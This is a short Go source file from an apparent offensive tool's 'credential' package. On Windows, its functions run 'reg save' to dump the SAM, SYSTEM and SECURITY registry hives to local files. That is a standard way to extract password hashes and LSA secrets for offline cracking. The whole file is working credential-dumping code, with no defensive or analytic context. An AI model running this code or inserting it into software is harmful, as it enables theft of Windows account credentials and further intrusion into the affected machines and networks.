//go:build windows

package credential

import (
"os/exec"
)

func DumpSAM() bool {
cmd := exec.Command("cmd", "/c", "reg save HKLM\\SAM sam.hive /y")
err := cmd.Run()
if err != nil {
return false
}
return true
}

func DumpSystem() bool {
cmd := exec.Command("cmd", "/c", "reg save HKLM\\SYSTEM system.hive /y")
err := cmd.Run()
if err != nil {
return false
}
return true
}

func DumpSecurity() bool {
cmd := exec.Command("cmd", "/c", "reg save HKLM\\SECURITY security.hive /y")
err := cmd.Run()
if err != nil {
return false
}
return true
}

func DumpAllHives() bool {
DumpSAM()
DumpSystem()
DumpSecurity()
return true
}
